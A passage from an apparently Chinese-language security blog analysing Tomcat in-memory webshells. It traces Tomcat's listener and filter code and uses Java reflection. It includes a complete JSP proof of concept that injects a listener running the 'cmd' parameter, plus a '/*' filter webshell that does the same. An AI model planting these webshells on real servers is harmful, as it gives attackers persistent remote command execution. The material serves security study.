keyword">try</span> <span class="token punctuation">{</span>                    listener<span class="token punctuation">.</span><span class="token function">requestInitialized</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> t<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    ExceptionUtils<span class="token punctuation">.</span><span class="token function">handleThrowable</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>sm<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span>                            <span class="token string">"standardContext.requestListener.requestInit"</span><span class="token punctuation">,</span>                            instance<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">;</span>                    request<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span>RequestDispatcher<span class="token punctuation">.</span>ERROR_EXCEPTION<span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>简单分析一下创建监听器的流程：</p><pre class=" language-xml"><code class="language-xml">1.获取当前上下文的所有监听器2.获取StandardContext上下文3.创建监听器</code></pre><p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240302090547-6cnrs9c.png" alt="image">​</p><p>所以利用jsp技术动态创建监听器也是一样的道理</p><h3 id="第一步-添加监听器"><a href="#第一步-添加监听器" class="headerlink" title="第一步 添加监听器"></a>第一步 添加监听器</h3><p>首先就是添加监听器，跟进<code>getApplicationEventListeners</code>​函数</p><p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240302091423-nb4heks.png" alt="image">​</p><p>继续跟进<code>applicationEventListenersList</code>​</p><p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240302091451-t8eozkt.png" alt="image">​</p><p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240302091559-2cfgkhr.png" alt="image">​</p><p>发现这个属性就可以直接添加监听器了</p><p>跟进：</p><p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240302091930-rz44pjr.png" alt="image">​</p><p>是<code>addApplicationEventListener</code>​函数可以添加监听器，那么第一步就解决了</p><p>这里注意的就是这个<code>StandardContext</code>​类的，后面jsp的时候获取也是<code>StandardContext</code>​类，但是只有<code>getServletContext</code>​这个方法，所以获取他的父类Context，使用<code>getContext</code>​方法</p><h3 id="第二步-获取ServletContext"><a href="#第二步-获取ServletContext" class="headerlink" title="第二步 获取ServletContext"></a>第二步 获取ServletContext</h3><p><code>invoke:116, StandardHostValve (org.apache.catalina.core)</code>​这一步可以发现他获取servlet的方式：</p><p> <img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240302092238-ic9set6.png" alt="image">​</p><p>恰好jsp也内置了request，所以这里也是可以利用</p><p>只需要反射利用Field获取即可</p><pre class=" language-java"><code class="language-java">Field requestField <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>requestField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Request requests <span class="token operator">=</span> <span class="token punctuation">(</span>Request<span class="token punctuation">)</span> requestField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这里回顾的时候有点太久没学反射了，把request.get(obj)和request.get(null)给搞混了</p><p>这里有两个例子(返回的结果都是<code>Hello, qingfeng!</code>​)，运行一下就能会议起来了</p><pre class=" language-java"><code class="language-java">例一<span class="token punctuation">[</span>Field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IllegalAccessException <span class="token punctuation">{</span>        MyClass obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 获取 Class 对象</span>        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> cls <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 获取字段的值</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            Field field <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"myField"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// "myField" 是字段的名称</span>            field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 设置为可访问，以便获取或设置私有字段的值</span>            <span class="token comment" spellcheck="true">// 获取字段的值</span>            Object value <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"字段的值："</span> <span class="token operator">+</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchFieldException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">MyClass</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> String  myField <span class="token operator">=</span> <span class="token string">"Hello, qingfeng!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>例二<span class="token punctuation">[</span>Field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IllegalAccessException <span class="token punctuation">{</span>        MyClass obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 获取 Class 对象</span>        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> cls <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 获取字段的值</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            Field field <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"myField"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// "myField" 是字段的名称</span>            field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 设置为可访问，以便获取或设置私有字段的值</span>            <span class="token comment" spellcheck="true">// 获取字段的值</span>            Object value <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"字段的值："</span> <span class="token operator">+</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchFieldException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">MyClass</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> String  myField <span class="token operator">=</span> <span class="token string">"Hello, qingfeng!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="POC："><a href="#POC：" class="headerlink" title="POC："></a>POC：</h3><pre class=" language-jsp"><code class="language-jsp"><%@ page import="java.io.IOException" %><%@ page import="java.lang.reflect.Field" %><%@ page import="org.apache.catalina.connector.Request" %><%@ page import="org.apache.catalina.core.StandardContext" %><%@ page import="javax.servlet.annotation.WebListener" %><%!    @WebListener    public class ServletListener implements ServletRequestListener {        @Override        public void requestDestroyed (ServletRequestEvent sre) {            System.out.println("requestDestroyed");        }        @Override        public void requestInitialized (ServletRequestEvent sre) {            ServletRequest servletRequest = sre.getServletRequest();            String cmd = servletRequest.getParameter("cmd");            if(cmd != null){                try {                    Runtime.getRuntime().exec(cmd);                } catch (IOException e) {                    throw new RuntimeException(e);                }            }        }    }%><%    Field requestField = request.getClass().getDeclaredField("request");    requestField.setAccessible(true);    Request requests = (Request) requestField.get(request);    StandardContext context = (StandardContext)requests.getContext();    ServletListener servletListener = new ServletListener();    context.addApplicationEventListener(servletListener);%></code></pre><h2 id="Filter型内存马"><a href="#Filter型内存马" class="headerlink" title="Filter型内存马"></a>Filter型内存马</h2><p>Filter是链式调用执行的，Filter会在访问不Web资源之前被执行，而且定义Filter时可以根据访问的路径来设置，相对来说更灵活。</p><p>首先同理创建一个Java文件写Filter型内存马：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>WebFilter<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token annotation punctuation">@WebFilter</span><span class="token punctuation">(</span><span class="token string">"/*"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServletFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span>FilterConfig filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException <span class="token punctuation">{</span>        Filter<span class="token punctuation">.</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span>filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span>ServletRequest request<span class="token punctuation">,</span> ServletResponse response<span class="token punctuation">,</span> FilterChain chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ServletException <span class="token punctuation">{</span>        String cmd <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cmd <span class="token operator">!=</span> null<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Filter<span class="token punctuation">.</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>记得要加<code>chain.doFilter(request, response);</code>​不然后面都被阻塞了</p><p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240302110337-pd1ucxt.png" alt="image">​</p><p>在cmd下断点看堆栈情况：</p><pre class=" language-java"><code class="language-java">doFilter<span class="token operator">:</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token function">ServletFilter</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">)</span>internalDoFilter<span class="token operator">:</span><span class="token number">178</span><span class="token punctuation">,</span> <span class="token function">ApplicationFilterChain</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">)</span>doFilter<span class="token operator">:</span><span class="token number">153</span><span class="token punctuation">,</span> <span class="token function">ApplicationFilterChain</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">)</span>invoke<span class="token operator">:</span><span class="token number">168</span><span class="token punctuation">,</span> <span class="token function">StandardWrapperValve</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">)</span>invoke<span class="token operator">:</span><span class="token number">90</span><span class="token punctuation">,</span> <span class="token function">StandardContextValve</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">)</span>invoke<span class="token operator">:</span><span class="token number">481</span><span class="token punctuation">,</span> <span class="token function">AuthenticatorBase</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>authenticator<span class="token punctuation">)</span>invoke<span class="token operator">:</span><span class="token number">130</span><span class="token punctuation">,</span> <span class="token function">StandardHostValve</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">)</span>invoke<span class="token operator">:</span><span class="token number">93</span><span class="token punctuation">,</span> <span class="token function">ErrorReportValve</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>valves<span class="token punctuation">)</span>invoke<span class="token operator">:</span><span class="token number">670</span><span class="token punctuation">,</span> <span class="token function">AbstractAccessLogValve</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>valves<span class="token punctuation">)</span>invoke<span class="token operator">:</span><span class="token number">74</span><span class="token punctuation">,</span> <span class="token function">StandardEngineValve</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">)</span>service<span class="token operator">:</span><span class="token number">342</span><span class="token punctuation">,</span> <span class="token function">CoyoteAdapter</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>connector<span class="token punctuation">)</span>service<span class="token operator">:</span><span class="token number">390</span><span class="token punctuation">,</span> <span class="token function">Http11Processor</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>coyote<span class="token punctuation">.</span>http11<span class="token punctuation">)</span>process<span class="token operator">:</span><span class="token number">63</span><span class="token punctuation">,</span> <span class="token function">AbstractProcessorLight</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>coyote<span class="token punctuation">)</span>process<span class="token operator">:</span><span class="token number">928</span><span class="token punctuation">,</span> AbstractProtocol$<span class="token function">ConnectionHandler</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>coyote<span class="token punctuation">)</span>doRun<span class="token operator">:</span><span class="token number">1794</span><span class="token punctuation">,</span> NioEndpoint$<span class="token function">SocketProcessor</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span>util<span class="token punctuation">.</span>net<span class="token punctuation">)</span>run<span class="token operator">:</span><span class="token number">52</span><span class="token punctuation">,</span> <span class="token function">SocketProcessorBase</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span>util<span class="token punctuation">.</span>net<span class="token punctuation">)</span>runWorker<span class="token operator">:</span><span class="token number">1191</span><span class="token punctuation">,</span> <span class="token function">ThreadPoolExecutor</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span>util<span class="token punctuation">.</span>threads<span class="token punctuation">)</span>run<span class="token operator">:</span><span class="token number">659</span><span class="token punctuation">,</span> ThreadPoolExecutor$<span class="token function">Worker</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span>util<span class="token punctuation">.</span>threads<span class="token punctuation">)</span>run<span class="token operator">:</span><span class="token number">61</span><span class="token punctuation">,</span> TaskThread$<span class="token function">WrappingRunnable</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span>util<span class="token punctuation">.</span>threads<span class="token punctuation">)</span>run<span class="token operator">:</span><span class="token number">745</span><span class="token punctuation">,</span> <span class="token function">Thread</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">)</span></code></pre><p>和Listener同理，我们直接定位关键步骤<code>internalDoFilter:178, ApplicationFilterChain (org.apache.catalina.core)</code>​</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">internalDoFilter</span><span class="token punctuation">(</span>ServletRequest request<span class="token punctuation">,</span>                                  ServletResponse response<span class="token punctuation">)</span>        <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ServletException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Call the next filter if there is one</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pos <span class="token operator">&lt;</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>            ApplicationFilterConfig filterConfig <span class="token operator">=</span> filters<span class="token punctuation">[</span>pos<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                Filter filter <span class="token operator">=</span> filterConfig<span class="token punctuation">.</span><span class="token function">getFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">isAsyncSupported</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token string">"false"</span><span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>                        filterConfig<span class="token punctuation">.</span><span class="token function">getFilterDef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAsyncSupported</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    request<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span>Globals<span class="token punctuation">.</span>ASYNC_SUPPORTED_ATTR<span class="token punctuation">,</span> Boolean<span class="token punctuation">.</span>FALSE<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span><span class="token punctuation">(</span> Globals<span class="token punctuation">.</span>IS_SECURITY_ENABLED <span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">final</span> ServletRequest req <span class="token operator">=</span> request<span class="token punctuation">;</span>                    <span class="token keyword">final</span> ServletResponse res <span class="token operator">=</span> response<span class="token punctuation">;</span>                    Principal principal <span class="token operator">=</span>                        <span class="token punctuation">(</span><span class="token punctuation">(</span>HttpServletRequest<span class="token punctuation">)</span> req<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getUserPrincipal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    Object<span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">}</span><span class="token punctuation">;</span>                    SecurityUtil<span class="token punctuation">.</span><span class="token function">doAsPrivilege</span> <span class="token punctuation">(</span><span class="token string">"doFilter"</span><span class="token punctuation">,</span> filter<span class="token punctuation">,</span> classType<span class="token punctuation">,</span> args<span class="token punctuation">,</span> principal<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    filter<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> <span class="token operator">|</span> ServletException <span class="token operator">|</span> RuntimeException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> e<span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                e <span class="token operator">=</span> ExceptionUtils<span class="token punctuation">.</span><span class="token function">unwrapInvocationTargetException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>                ExceptionUtils<span class="token punctuation">.</span><span class="token function">handleThrowable</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServletException</span><span class="token punctuation">(</span>sm<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"filterChain.filter"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// We fell off the end of the chain -- call the servlet instance</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>ApplicationDispatcher<span class="token punctuation">.</span>WRAP_SAME_OBJECT<span class="token punctuation">)</span> <span class="token punctuation">{</span>                lastServicedRequest<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>                lastServicedResponse<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">isAsyncSupported</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>servletSupportsAsync<span class="token punctuation">)</span> <span class="token punctuation">{</span>                request<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span>Globals<span class="token punctuation">.</span>ASYNC_SUPPORTED_ATTR<span class="token punctuation">,</span>                        Boolean<span class="token punctuation">.</span>FALSE<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// Use potentially wrapped request from this point</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>request <span class="token keyword">instanceof</span> <span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>                    <span class="token punctuation">(</span>response <span class="token keyword">instanceof</span> <span class="token class-name">HttpServletResponse</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>                    Globals<span class="token punctuation">.</span>IS_SECURITY_ENABLED <span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">final</span> ServletRequest req <span class="token operator">=</span> request<span class="token punctuation">;</span>                <span class="token keyword">final</span> ServletResponse res <span class="token operator">=</span> response<span class="token punctuation">;</span>                Principal principal <span class="token operator">=</span>                    <span class="token punctuation">(</span><span class="token punctuation">(</span>HttpServletRequest<span class="token punctuation">)</span> req<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getUserPrincipal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                Object<span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>req<span class="token punctuation">,</span> res<span class="token punctuation">}</span><span class="token punctuation">;</span>                SecurityUtil<span class="token punctuation">.</span><span class="token function">doAsPrivilege</span><span class="token punctuation">(</span><span class="token string">"service"</span><span class="token punctuation">,</span>                                           servlet<span class="token punctuation">,</span>                                           classTypeUsedInService<span class="token punctuation">,</span>                                           args<span class="token punctuation">,</span>                                           principal<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                servlet<span class="token punctuation">.</span><span class="token function">service</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> <span class="token operator">|</span> ServletException <span class="token operator">|</span> RuntimeException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> e<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e <span class="token operator">=</span> ExceptionUtils<span class="token punctuation">.</span><span class="token function">unwrapInvocationTargetException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token 